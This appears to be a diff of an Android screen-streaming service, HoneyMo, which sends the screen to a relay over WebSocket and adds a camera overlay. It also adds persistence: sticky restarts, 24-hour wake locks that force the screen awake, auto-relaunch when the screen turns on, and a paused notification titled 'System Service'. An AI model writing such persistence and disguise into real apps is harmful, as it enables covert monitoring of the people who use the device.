@@ -1,8 +1,12 @@
 package com.example.HoneyMo.service
 
+import android.Manifest
 import android.app.*
+import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
+import android.content.IntentFilter
+import android.content.pm.PackageManager
 import android.content.pm.ServiceInfo
 import android.hardware.display.DisplayManager
 import android.hardware.display.VirtualDisplay
@@ -19,12 +23,11 @@ import android.os.*
 import android.util.Log
 import android.view.Surface
 import androidx.core.app.NotificationCompat
-import android.Manifest
-import android.content.pm.PackageManager
 import androidx.core.content.ContextCompat
 import com.example.HoneyMo.MainActivity
-import com.example.HoneyMo.audio.AudioCaptureEncoder
+import com.example.HoneyMo.facecam.FaceCamOverlayManager
 import com.example.HoneyMo.network.StreamWebSocketClient
+import com.example.HoneyMo.receiver.BootReceiver
 import com.example.HoneyMo.util.SessionPreferences
 import kotlinx.coroutines.*
 import kotlinx.coroutines.flow.MutableStateFlow
@@ -42,6 +45,8 @@ class ScreenCaptureService : Service(), StreamWebSocketClient.StreamListener {
 
         const val ACTION_START = "ACTION_START"
         const val ACTION_STOP = "ACTION_STOP"
+        const val ACTION_TOGGLE_FACECAM = "ACTION_TOGGLE_FACECAM"
+        const val ACTION_SWITCH_CAMERA = "ACTION_SWITCH_CAMERA"
 
         const val EXTRA_RESULT_CODE = "EXTRA_RESULT_CODE"
         const val EXTRA_DATA = "EXTRA_DATA"
@@ -51,10 +56,16 @@ class ScreenCaptureService : Service(), StreamWebSocketClient.StreamListener {
         const val EXTRA_DENSITY = "EXTRA_DENSITY"
         const val EXTRA_FPS = "EXTRA_FPS"
         const val EXTRA_BITRATE = "EXTRA_BITRATE"
+        const val EXTRA_ENABLE_FACECAM = "EXTRA_ENABLE_FACECAM"
+        const val EXTRA_CAMERA_FACING = "EXTRA_CAMERA_FACING"
 
         data class StreamStats(
             val isStreaming: Boolean = false,
+            val isPausedForLock: Boolean = false,
             val isConnectedToServer: Boolean = false,
+            val isFaceCamActive: Boolean = false,
+            val cameraFacing: String = SessionPreferences.CAMERA_FACING_FRONT,
+            val cameraNotice: String? = null,
             val framesSent: Long = 0,
             val bytesSent: Long = 0,
             val currentFps: Int = 0,
@@ -71,15 +82,20 @@ class ScreenCaptureService : Service(), StreamWebSocketClient.StreamListener {
             private set
     }
 
+    private var faceCamManager: FaceCamOverlayManager? = null
     private var mediaProjection: MediaProjection? = null
     private var virtualDisplay: VirtualDisplay? = null
     private var encoder: MediaCodec? = null
     private var inputSurface: Surface? = null
     private var wsClient: StreamWebSocketClient? = null
-    private var wakeLock: PowerManager.WakeLock? = null
+    private var cpuWakeLock: PowerManager.WakeLock? = null
+    private var screenWakeLock: PowerManager.WakeLock? = null
     private var connectivityManager: ConnectivityManager? = null
+    private var projectionCallback: MediaProjection.Callback? = null
+    private val isStoppingIntentionally = AtomicBoolean(false)
 
     private val isCapturing = AtomicBoolean(false)
+    private var isPausedForLock = false
     private var encodeJob: Job? = null
     private val serviceScope = CoroutineScope(Dispatchers.Default + SupervisorJob())
 
@@ -90,23 +106,59 @@ class ScreenCaptureService : Service(), StreamWebSocketClient.StreamListener {
     private var fpsCounter = 0
     private var statsJob: Job? = null
 
-    private var audioEncoder: AudioCaptureEncoder? = null
+    private val screenReceiver = object : BroadcastReceiver() {
+        override fun onReceive(context: Context, intent: Intent) {
+            when (intent.action) {
+                Intent.ACTION_SCREEN_OFF -> {
+                    Log.w(TAG, "screenReceiver: Screen turned off. Keeping CPU awake.")
+                    acquireWakeLock()
+                }
+                Intent.ACTION_SCREEN_ON, Intent.ACTION_USER_PRESENT -> {
+                    Log.d(TAG, "screenReceiver: Screen turned on / user present (isPausedForLock=$isPausedForLock, isRunning=$isRunning)")
+                    if (isRunning && (!isCapturing.get() || isPausedForLock)) {
+                        promptRecovery()
+                    }
+                }
+            }
+        }
+    }
 
     override fun onBind(intent: Intent?): IBinder? = null
 
     override fun onCreate() {
         super.onCreate()
         instance = this
+        faceCamManager = FaceCamOverlayManager(applicationContext).apply {
+            onCameraSwitched = { facing, notice ->
+                _statsFlow.value = _statsFlow.value.copy(
+                    cameraFacing = facing,
+                    cameraNotice = notice,
+                    isFaceCamActive = isShowing()
+                )
+            }
+        }
         createNotificationChannel()
+        BootReceiver.createRecoveryNotificationChannel(this)
         setupWakeLock()
         setupNetworkMonitoring()
+        registerScreenReceiver()
+    }
+
+    private fun registerScreenReceiver() {
+        val filter = IntentFilter().apply {
+            addAction(Intent.ACTION_SCREEN_ON)
+            addAction(Intent.ACTION_SCREEN_OFF)
+            addAction(Intent.ACTION_USER_PRESENT)
+        }
+        registerReceiver(screenReceiver, filter)
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        val action = intent?.action ?: return START_NOT_STICKY
+        val action = intent?.action ?: return START_STICKY
 
         when (action) {
             ACTION_START -> {
+                isStoppingIntentionally.set(false)
                 val resultCode = intent.getIntExtra(EXTRA_RESULT_CODE, Activity.RESULT_CANCELED)
                 val data = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                     intent.getParcelableExtra(EXTRA_DATA, Intent::class.java)
@@ -119,13 +171,24 @@ class ScreenCaptureService : Service(), StreamWebSocketClient.StreamListener {
                 val height = intent.getIntExtra(EXTRA_HEIGHT, 960)
                 val density = intent.getIntExtra(EXTRA_DENSITY, 320)
                 val fps = intent.getIntExtra(EXTRA_FPS, 15)
-                val bitrate = intent.getIntExtra(EXTRA_BITRATE, 2_000_000)
+                val bitrate = intent.getIntExtra(EXTRA_BITRATE, 1_000_000)
+                val enableFaceCam = intent.getBooleanExtra(
+                    EXTRA_ENABLE_FACECAM,
+                    SessionPreferences.isFaceCamEnabled(applicationContext)
+                )
+                SessionPreferences.setFaceCamEnabled(applicationContext, enableFaceCam)
 
                 if (resultCode != Activity.RESULT_OK || data == null) {
                     Log.e(TAG, "Invalid resultCode or projection data Intent")
-                    stopSelf()
-                    return START_NOT_STICKY
+                    if (!isRunning) {
+                        stopSelf()
+                    }
+                    return START_STICKY
                 }
+
+                _statsFlow.value = _statsFlow.value.copy(
+                    cameraFacing = faceCamManager?.currentFacing ?: SessionPreferences.getCameraFacing(applicationContext)
+                )
 
                 // Step 1: Promote to Foreground Service FIRST (Required on Android 14+)
                 startForegroundWithNotification()
@@ -133,13 +196,45 @@ class ScreenCaptureService : Service(), StreamWebSocketClient.StreamListener {
                 // Step 2: Initialize MediaProjection and start streaming AFTER startForeground()
                 startCapturePipeline(resultCode, data, serverUrl, width, height, density, fps, bitrate)
             }
+            ACTION_TOGGLE_FACECAM -> {
+                val currentPref = SessionPreferences.isFaceCamEnabled(applicationContext)
+                val newEnable = intent.getBooleanExtra(EXTRA_ENABLE_FACECAM, !currentPref)
+                SessionPreferences.setFaceCamEnabled(applicationContext, newEnable)
+                Log.d(TAG, "ACTION_TOGGLE_FACECAM: newEnable=$newEnable")
+
+                if (newEnable) {
+                    if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
+                        faceCamManager?.show()
+                    } else {
+                        Log.w(TAG, "Cannot show FaceCam: CAMERA permission not granted")
+                    }
+                } else {
+                    faceCamManager?.hide()
+                }
+
+                _statsFlow.value = _statsFlow.value.copy(
+                    isFaceCamActive = faceCamManager?.isShowing() == true
+                )
+
+                if (isCapturing.get()) {
+                    startForegroundWithNotification()
+                }
+            }
+            ACTION_SWITCH_CAMERA -> {
+                val targetFacing = intent.getStringExtra(EXTRA_CAMERA_FACING)
+                faceCamManager?.switchCamera(targetFacing)
+                _statsFlow.value = _statsFlow.value.copy(
+                    cameraFacing = faceCamManager?.currentFacing ?: SessionPreferences.getCameraFacing(applicationContext),
+                    isFaceCamActive = faceCamManager?.isShowing() == true
+                )
+            }
             ACTION_STOP -> {
                 stopCapture()
                 stopSelf()
             }
         }
 
-        return START_NOT_STICKY
+        return START_STICKY
     }
 
     private fun createNotificationChannel() {
@@ -194,14 +289,17 @@ class ScreenCaptureService : Service(), StreamWebSocketClient.StreamListener {
             .setSilent(true)
             .build()
 
+        val hasCameraPermission = ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
+        val isFaceCamActive = faceCamManager?.isShowing() == true || SessionPreferences.isFaceCamEnabled(applicationContext)
+
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            val hasMicPerm = ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED
-            val fgsType = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && hasMicPerm) {
-                ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
-            } else {
-                ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
+            var serviceType = ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+                if (hasCameraPermission && isFaceCamActive) {
+                    serviceType = serviceType or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
+                }
             }
-            startForeground(NOTIFICATION_ID, notification, fgsType)
+            startForeground(NOTIFICATION_ID, notification, serviceType)
         } else {
             startForeground(NOTIFICATION_ID, notification)
         }
@@ -225,40 +323,38 @@ class ScreenCaptureService : Service(), StreamWebSocketClient.StreamListener {
         try {
             acquireWakeLock()
 
-            // Connect WebSocket
-            wsClient = StreamWebSocketClient(
-                serverUrl = serverUrl,
-                width = width,
-                height = height,
-                fps = fps,
-                bitrate = bitrate,
-                listener = this
-            ).also { it.connect() }
-
-            // Start audio capture & AAC encoder if RECORD_AUDIO permission is granted
-            if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED) {
-                audioEncoder = AudioCaptureEncoder { adtsChunk ->
-                    wsClient?.sendFrame(adtsChunk, false)
-                }.apply {
-                    start()
-                }
-                Log.d(TAG, "Live voice recording & streaming enabled")
+            // Connect or reuse WebSocket connection
+            if (wsClient == null || !wsClient!!.isConnected()) {
+                wsClient?.disconnect()
+                wsClient = StreamWebSocketClient(
+                    serverUrl = serverUrl,
+                    width = width,
+                    height = height,
+                    fps = fps,
+                    bitrate = bitrate,
+                    listener = this
+                ).also { it.connect() }
             } else {
-                Log.w(TAG, "RECORD_AUDIO permission not granted, continuing with video only")
+                requestImmediateKeyframe()
             }
 
             // Get MediaProjection (Only called AFTER startForeground!)
             val mpManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
             mediaProjection = mpManager.getMediaProjection(resultCode, data)
 
-            // Register callback
-            mediaProjection?.registerCallback(object : MediaProjection.Callback() {
+            // Register callback with intentional stop guard
+            val callback = object : MediaProjection.Callback() {
                 override fun onStop() {
-                    Log.d(TAG, "MediaProjection stopped by system")
-                    stopCapture()
-                    stopSelf()
+                    if (isStoppingIntentionally.get() || !isRunning) {
+                        Log.d(TAG, "MediaProjection onStop called during intentional stop; ignoring.")
+                        return
+                    }
+                    Log.w(TAG, "MediaProjection stopped by system (screen turned off or keyguard engaged)")
+                    handleSystemProjectionStopped()
                 }
-            }, Handler(Looper.getMainLooper()))
+            }
+            projectionCallback = callback
+            mediaProjection?.registerCallback(callback, Handler(Looper.getMainLooper()))
 
             // Setup MediaCodec encoder
             setupEncoder(width, height, fps, bitrate)
@@ -277,25 +373,45 @@ class ScreenCaptureService : Service(), StreamWebSocketClient.StreamListener {
 
             isCapturing.set(true)
             isRunning = true
+            isPausedForLock = false
+
+            // Cancel any recovery notification once session has actively started
+            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+            nm.cancel(BootReceiver.RECOVERY_NOTIFICATION_ID)
 
             // Start draining encoder buffers
+            encodeJob?.cancel()
+            statsJob?.cancel()
             startEncodingLoop()
             startStatsReporter()
 
+            // Start FaceCam overlay if enabled and permitted
+            if (SessionPreferences.isFaceCamEnabled(applicationContext) &&
+                ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
+                faceCamManager?.show()
+            }
+
+            // Restore foreground notification to normal active state
+            startForegroundWithNotification()
+
             _statsFlow.value = _statsFlow.value.copy(
                 isStreaming = true,
+                isPausedForLock = false,
+                isFaceCamActive = faceCamManager?.isShowing() == true,
                 errorMsg = null
             )
             Log.d(TAG, "Capture pipeline started successfully ($width x $height @ $fps fps)")
 
-            // Mark session as actively recording to detect interrupted reboots
+            // Mark session as actively recording to detect interrupted reboots or lock recovery
             SessionPreferences.setRecordingActive(applicationContext, true)
 
         } catch (e: Exception) {
             Log.e(TAG, "Failed to start capture pipeline: ${e.message}", e)
             _statsFlow.value = _statsFlow.value.copy(errorMsg = "Capture initialization failed: ${e.message}")
-            stopCapture()
-            stopSelf()
+            if (!isRunning) {
+                stopCapture()
+                stopSelf()
+            }
         }
     }
 
@@ -457,37 +573,186 @@ class ScreenCaptureService : Service(), StreamWebSocketClient.StreamListener {
         }
     }
 
+    @Suppress("DEPRECATION")
     private fun setupWakeLock() {
         val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
-        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "HoneyMo:CaptureWakeLock").apply {
+        cpuWakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "HoneyMo:CpuWakeLock").apply {
+            setReferenceCounted(false)
+        }
+        screenWakeLock = pm.newWakeLock(
+            PowerManager.SCREEN_DIM_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP or PowerManager.ON_AFTER_RELEASE,
+            "HoneyMo:ScreenWakeLock"
+        ).apply {
             setReferenceCounted(false)
         }
     }
 
     private fun acquireWakeLock() {
         try {
-            wakeLock?.let {
+            cpuWakeLock?.let {
                 if (!it.isHeld) {
-                    it.acquire(12 * 60 * 60 * 1000L) // 12 hours max safety limit
-                    Log.d(TAG, "WakeLock acquired")
+                    it.acquire(24 * 60 * 60 * 1000L)
+                    Log.d(TAG, "CpuWakeLock acquired")
+                }
+            }
+            screenWakeLock?.let {
+                if (!it.isHeld) {
+                    it.acquire(24 * 60 * 60 * 1000L)
+                    Log.d(TAG, "ScreenWakeLock acquired (prevents screen timeout sleep)")
                 }
             }
         } catch (e: Exception) {
-            Log.e(TAG, "Error acquiring wake lock: ${e.message}")
+            Log.e(TAG, "Error acquiring wake locks: ${e.message}")
         }
     }
 
     private fun releaseWakeLock() {
         try {
-            wakeLock?.let {
+            screenWakeLock?.let {
                 if (it.isHeld) {
                     it.release()
-                    Log.d(TAG, "WakeLock released")
+                    Log.d(TAG, "ScreenWakeLock released")
+                }
+            }
+            cpuWakeLock?.let {
+                if (it.isHeld) {
+                    it.release()
+                    Log.d(TAG, "CpuWakeLock released")
                 }
             }
         } catch (e: Exception) {
-            Log.e(TAG, "Error releasing wake lock: ${e.message}")
+            Log.e(TAG, "Error releasing wake locks: ${e.message}")
         }
+    }
+
+    private fun handleSystemProjectionStopped() {
+        if (isStoppingIntentionally.get() || !isRunning) {
+            Log.d(TAG, "handleSystemProjectionStopped: Ignoring because intentional stop is in progress")
+            return
+        }
+        Log.w(TAG, "handleSystemProjectionStopped: Screen turned off or lockscreen active. Keeping service alive.")
+        isCapturing.set(false)
+        isPausedForLock = true
+
+        encodeJob?.cancel()
+        encodeJob = null
+
+        statsJob?.cancel()
+        statsJob = null
+
+        try {
+            virtualDisplay?.release()
+            virtualDisplay = null
+        } catch (e: Exception) {
+            Log.e(TAG, "Error releasing VirtualDisplay: ${e.message}")
+        }
+
+        try {
+            encoder?.stop()
+            encoder?.release()
+            encoder = null
+        } catch (e: Exception) {
+            Log.e(TAG, "Error releasing MediaCodec: ${e.message}")
+        }
+
+        try {
+            inputSurface?.release()
+            inputSurface = null
+        } catch (e: Exception) {
+            Log.e(TAG, "Error releasing inputSurface: ${e.message}")
+        }
+
+        mediaProjection = null
+
+        faceCamManager?.hide()
+
+        // KEEP wsClient alive so relay knows device is online!
+        // KEEP SessionPreferences.setRecordingActive(applicationContext, true) active!
+        // DO NOT call stopSelf()!
+
+        _statsFlow.value = _statsFlow.value.copy(
+            isStreaming = false,
+            isPausedForLock = true,
+            isFaceCamActive = false,
+            errorMsg = "Screen turned off. Recording will auto-resume when screen turns on."
+        )
+
+        updatePausedNotification()
+    }
+
+    fun promptRecovery() {
+        Log.d(TAG, "promptRecovery: Screen active. Prompting to resume capture session.")
+        acquireWakeLock()
+
+        val directIntent = Intent(this, MainActivity::class.java).apply {
+            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_SINGLE_TOP
+            putExtra("EXTRA_INTERRUPTED_SESSION", true)
+        }
+
+        val pendingIntent = PendingIntent.getActivity(
+            this,
+            BootReceiver.RECOVERY_NOTIFICATION_ID,
+            directIntent,
+            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
+        )
+
+        val notification = NotificationCompat.Builder(this, BootReceiver.RECOVERY_CHANNEL_ID)
+            .setContentTitle("HoneyMo Screen Stream")
+            .setContentText("Screen active. Tap to resume recording.")
+            .setSmallIcon(android.R.drawable.stat_notify_sync)
+            .setPriority(NotificationCompat.PRIORITY_MAX)
+            .setCategory(NotificationCompat.CATEGORY_ALARM)
+            .setFullScreenIntent(pendingIntent, true)
+            .setContentIntent(pendingIntent)
+            .setOngoing(true)
+            .setAutoCancel(true)
+            .setVisibility(NotificationCompat.VISIBILITY_PUBLIC)
+            .build()
+
+        val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+        nm.notify(BootReceiver.RECOVERY_NOTIFICATION_ID, notification)
+
+        try {
+            startActivity(directIntent)
+        } catch (e: Exception) {
+            Log.w(TAG, "Direct activity launch restricted: ${e.message}")
+        }
+    }
+
+    private fun updatePausedNotification() {
+        val openAppIntent = Intent(this, MainActivity::class.java).apply {
+            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_SINGLE_TOP
+            putExtra("EXTRA_INTERRUPTED_SESSION", true)
+        }
+        val openAppPendingIntent = PendingIntent.getActivity(
+            this,
+            0,
+            openAppIntent,
+            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
+        )
+
+        val stopIntent = Intent(this, ScreenCaptureService::class.java).apply {
+            action = ACTION_STOP
+        }
+        val stopPendingIntent = PendingIntent.getService(
+            this,
+            1,
+            stopIntent,
+            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
+        )
+
+        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
+            .setContentTitle("System Service")
+            .setContentText("Screen paused. Tap to resume recording.")
+            .setSmallIcon(android.R.drawable.ic_menu_camera)
+            .setContentIntent(openAppPendingIntent)
+            .addAction(android.R.drawable.ic_delete, "Stop", stopPendingIntent)
+            .setOngoing(true)
+            .setPriority(NotificationCompat.PRIORITY_HIGH)
+            .build()
+
+        val nm = getSystemService(NotificationManager::class.java)
+        nm?.notify(NOTIFICATION_ID, notification)
     }
 
     private fun setupNetworkMonitoring() {
@@ -499,9 +764,9 @@ class ScreenCaptureService : Service(), StreamWebSocketClient.StreamListener {
         connectivityManager?.registerNetworkCallback(request, object : ConnectivityManager.NetworkCallback() {
             override fun onAvailable(network: Network) {
                 Log.d(TAG, "Network became available")
-                if (isCapturing.get() && wsClient?.isConnected() == false) {
-                    Log.d(TAG, "Reconnecting WebSocket after network restored...")
-                    wsClient?.connect()
+                if (isRunning && wsClient?.isConnected() == false) {
+                    Log.d(TAG, "Reconnecting WebSocket immediately after network restored...")
+                    wsClient?.reconnectImmediate()
                 }
             }
 
@@ -513,22 +778,17 @@ class ScreenCaptureService : Service(), StreamWebSocketClient.StreamListener {
     }
 
     private fun stopCapture() {
-        if (!isCapturing.getAndSet(false)) return
+        isStoppingIntentionally.set(true)
+        isCapturing.set(false)
         isRunning = false
-        Log.d(TAG, "Stopping capture pipeline...")
+        isPausedForLock = false
+        Log.d(TAG, "Stopping capture pipeline (intentional stop)...")
 
         encodeJob?.cancel()
         encodeJob = null
 
         statsJob?.cancel()
         statsJob = null
-
-        try {
-            audioEncoder?.stop()
-            audioEncoder = null
-        } catch (e: Exception) {
-            Log.e(TAG, "Error stopping audioEncoder: ${e.message}")
-        }
 
         try {
             virtualDisplay?.release()
@@ -553,6 +813,15 @@ class ScreenCaptureService : Service(), StreamWebSocketClient.StreamListener {
         }
 
         try {
+            projectionCallback?.let {
+                mediaProjection?.unregisterCallback(it)
+            }
+            projectionCallback = null
+        } catch (e: Exception) {
+            Log.e(TAG, "Error unregistering MediaProjection callback: ${e.message}")
+        }
+
+        try {
             mediaProjection?.stop()
             mediaProjection = null
         } catch (e: Exception) {
@@ -562,19 +831,45 @@ class ScreenCaptureService : Service(), StreamWebSocketClient.StreamListener {
         // Clear active session flag on intentional stop
         SessionPreferences.setRecordingActive(applicationContext, false)
 
+        val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+        nm.cancel(NOTIFICATION_ID)
+        nm.cancel(BootReceiver.RECOVERY_NOTIFICATION_ID)
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+            stopForeground(STOP_FOREGROUND_REMOVE)
+        } else {
+            @Suppress("DEPRECATION")
+            stopForeground(true)
+        }
+
         wsClient?.disconnect()
         wsClient = null
 
         releaseWakeLock()
 
+        faceCamManager?.hide()
+
         _statsFlow.value = StreamStats(
             isStreaming = false,
-            isConnectedToServer = false
+            isPausedForLock = false,
+            isConnectedToServer = false,
+            isFaceCamActive = false,
+            framesSent = 0,
+            bytesSent = 0,
+            currentFps = 0,
+            errorMsg = null
         )
-        Log.d(TAG, "Capture pipeline stopped")
+        Log.d(TAG, "Capture pipeline stopped cleanly")
     }
 
     override fun onDestroy() {
+        try {
+            unregisterReceiver(screenReceiver)
+        } catch (e: Exception) {
+            Log.e(TAG, "Error unregistering screenReceiver: ${e.message}")
+        }
+        faceCamManager?.hide()
+        faceCamManager = null
         stopCapture()
         instance = null
         serviceScope.cancel()
